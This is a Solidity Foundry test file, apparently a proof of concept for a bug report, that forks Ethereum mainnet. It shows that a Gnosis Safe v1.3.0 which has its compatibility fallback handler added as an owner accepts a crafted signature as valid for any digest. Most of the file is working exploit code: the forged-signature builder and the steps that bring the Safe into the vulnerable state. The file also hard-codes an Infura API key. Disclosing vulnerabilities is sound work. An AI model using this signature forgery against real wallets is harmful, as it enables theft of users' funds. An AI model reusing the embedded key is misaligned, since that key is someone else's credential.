// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GnosisSafe} from "../src/Codeslaw/contracts/GnosisSafe.sol";
import {IGnosisSafeProxyFactory} from "./interfaces/IGnosisSafeProxyFactory.sol";
import {ISafeSetup} from "./interfaces/ISafeSetup.sol";
// consider importing direct 4rm guthub
import {SignatureChecker} from "lib/openzeppelin-contracts/contracts/utils/cryptography/SignatureChecker.sol"; 
import {IGnosisSafe, Enum} from "./interfaces/IGnosisSafe.sol";

contract FBH {
    fallback() external payable{}
}

contract GnosisSafeSignature is Test {
    using SignatureChecker for address;
    FBH fbh;

    //Mainnet state
    string MAINNET_RPC_URL = "https://mainnet.infura.io/v3/3d05647a39544dafab60d295c1ece741";
    //Live mainnet Contract / addresses
    address constant COMPATIBILITY_FALLBACK_HANDLER = 0x017062a1dE2FE6b99BE3d9d37841FeD19F573804;
    address constant SAFE_SINGLETON = 0xfb1bffC9d739B8D520DaF37dF666da4C687191EA;
    IGnosisSafeProxyFactory constant SAFE_PROXY_FACTORY =
        IGnosisSafeProxyFactory(0xC22834581EbC8527d974F8a1c97E1bEA4EF910BC);

    //Safe Owner variables
    address EOAOwner;
    uint EOAPrivateKey;
    IGnosisSafe safeV_1_3_0;
   

    function setUp() public {
        //fork MAinnet
        uint forkId = vm.createSelectFork(MAINNET_RPC_URL);
        fbh = new FBH();
        //make EOA and privateKey for owner
        (EOAOwner,EOAPrivateKey) = makeAddrAndKey("EOAOwner");

        //Building params for calling `SAFE_PROXY_FACTORY::createProxyWithNonce()`
        address[] memory _owners = new address[](1);
        _owners[0] = EOAOwner;
        bytes memory initializer = abi.encodeCall(
            ISafeSetup.setup,
            (_owners, 1, address(0), "", address(fbh), address(0), 0, payable(address(0)))
        );
        //deploy safe
        address deployedSafe = SAFE_PROXY_FACTORY.createProxyWithNonce(SAFE_SINGLETON, initializer, 66666666);
        safeV_1_3_0 = IGnosisSafe(payable(deployedSafe));
        //assert correct deployment
        assertEq(EOAOwner,safeV_1_3_0.getOwners()[0]);
        
    }
    /**
    @dev This is a fuzz-test demonstrating that at the aforementioned vulnerable state, there exists a malicious signature that verifies all digest 
    (including bytes32(0)) as if it were rightly signed by user. CRITICAL!!
     */
    function testFuzz_BypassSignatureV_1_3_0(uint _randomDigest) public {
        string memory version = "1.3.0";
        assertEq(version, safeV_1_3_0.VERSION(),"Not expected version (1.3.0)");
        //generate and cache Malicious signature
        bytes memory malicioussignature = generateMaliciousSignature();
        address payable nullPayableAddress;
        Enum.Operation operation = Enum.Operation.wrap(0);
        uint256 nullUint;
        address nullAddress;
        uint256 _nonce = safeV_1_3_0.nonce();

        //Demonstrates signature verification correctly returns false for unsigned digest before state
        //change to address(handler) as owner
        vm.expectRevert();
        bool verified = address(safeV_1_3_0).isValidSignatureNow(bytes32(_randomDigest), malicioussignature); 
        //assert False for verification
        assertFalse(verified);

        //Now change to vulnerable state (adding an owner)
        bytes32 txHash = IGnosisSafe(payable(safeV_1_3_0)).getTransactionHash(
            address(safeV_1_3_0),
            nullUint,
            abi.encodeCall(IGnosisSafe.addOwnerWithThreshold, (COMPATIBILITY_FALLBACK_HANDLER, 1)),
            operation,
            nullUint,
            nullUint,
            nullUint,
            nullAddress,
            nullPayableAddress,
            _nonce
        );
        //sign txHash for safe tx (ie adding an owner)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(EOAPrivateKey, txHash);
        bytes memory sig = abi.encodePacked(r, s, v);
        //call safe Tx
        safeV_1_3_0.execTransaction(
            address(safeV_1_3_0),
            nullUint,
            abi.encodeCall(IGnosisSafe.addOwnerWithThreshold, (COMPATIBILITY_FALLBACK_HANDLER, 1)),
            operation,
            nullUint,
            nullUint,
            nullUint,
            nullAddress,
            nullPayableAddress,
            sig
        );
        //assert handler address was added to owners array.
        assertTrue(safeV_1_3_0.isOwner(COMPATIBILITY_FALLBACK_HANDLER));

        //Demonstrates any digest will return true as if correctly signed by Safe user.
        //Note that `_randomDigest` is foundry fuzz output, hence can be any value. 
        // ================HENCE ANY VALUE / DIGEST WILL VERIFY. !!!!!==================//
        bool verified2 = address(safeV_1_3_0).isValidSignatureNow(bytes32(_randomDigest), malicioussignature); 
        //assert True for verification
        assertTrue(verified2);


    }

    /**
    @dev Function simply converts an addrress to bytes32 type so as to be encodePacked into r compartment of a signature.
     */
    function AddressToBytes(address _addr) private view returns(bytes32){
        return bytes32(uint256(uint160(_addr)));
    }

    /**
    @dev This function simply generates a malicious signature that bypasses the signature verification algorithm
    of all safe wallets. It encodes and Packs ehe following values at the ffg positions:
    `uint8(1)`                      --------> v
    `bytes32(address(handler))`     --------> r
    `bytes32(s)`                    --------> Doesnt matter the content of s. It still breaks
     */
    function generateMaliciousSignature() private returns (bytes memory) {
        uint8 v = uint8(1);
        bytes32 r = AddressToBytes(COMPATIBILITY_FALLBACK_HANDLER);
        bytes32 s;
        return abi.encodePacked(r, s, v);
    }

    //====Expecting this buys a LAMBO this Xmass. lol
}
